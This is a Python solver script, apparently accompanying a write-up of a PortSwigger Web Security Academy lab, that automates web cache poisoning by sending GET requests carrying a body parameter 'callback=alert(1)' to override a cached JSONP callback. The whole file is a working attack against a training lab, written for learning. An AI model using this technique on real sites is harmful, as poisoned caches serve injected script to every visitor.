#!/usr/bin/env python3
"""
Web cache poisoning via a fat GET request
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 08-fat-get-request.md

What this does:
    Sends a GET request carrying a request body (a "fat GET") to the same
    JSONP callback import used in the parameter-cloaking lab. The cache key
    is built only from the URL, but the back-end lets a same-named body
    parameter override the URL parameter, so callback=alert(1) in the body
    poisons a response cached under the clean callback=setCountryCookie URL.

Usage:
    python 08-fat-get-request.py <lab-url>
    e.g. python 08-fat-get-request.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import asyncio
import re
import secrets
import sys
import httpx


def _cache_buster() -> str:
    return secrets.token_hex(4)


def _is_cache_miss(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "miss" in xc or "miss" in cf


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def solve(lab_url: str) -> None:
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        # Step 1: find the JSONP/callback endpoint.
        r = await client.get(lab_url)
        js_paths = re.findall(r'src="(/js/[^"]+)"', r.text)

        jsonp_url = None
        for path in js_paths:
            base = f"{lab_url}{path.split('?')[0]}"
            r2 = await client.get(f"{base}?callback=testFunc&cb={_cache_buster()}")
            if "testFunc(" in r2.text:
                jsonp_url = base
                break

        if not jsonp_url:
            for path in ["/js/geolocate.js", "/js/localize.js"]:
                r3 = await client.get(f"{lab_url}{path}?callback=testFunc&cb={_cache_buster()}")
                if "testFunc(" in r3.text:
                    jsonp_url = f"{lab_url}{path}"
                    break

        if not jsonp_url:
            print("[-] No JSONP endpoint found -- cannot proceed")
            return
        print(f"[+] JSONP endpoint: {jsonp_url}")

        # Step 2: fat GET poison. URL keeps the clean, keyed callback value;
        # the body -- which the cache never inspects -- carries the payload.
        # Try with X-HTTP-Method-Override first (some servers won't read a
        # GET body without that hint), then fall back to a plain body.
        poison_url = f"{jsonp_url}?callback=setCountryCookie"
        body = "callback=alert(1)"
        headers_override = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-HTTP-Method-Override": "POST",
        }
        headers_no_override = {"Content-Type": "application/x-www-form-urlencoded"}

        for label, hdrs in [("with override", headers_override), ("without override", headers_no_override)]:
            print(f"[*] Fat GET poison + re-poison loop ({label})...")
            for cycle in range(40):
                r = await client.request("GET", poison_url, content=body, headers=hdrs)
                if "alert(1)" in r.text and _is_cache_miss(dict(r.headers)):
                    print(f"    Cycle {cycle + 1}: POISONED (miss)")

                if await _lab_solved(client, lab_url):
                    print("[+] Lab solved.")
                    return
                await asyncio.sleep(3)

    print("[-] Not solved")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
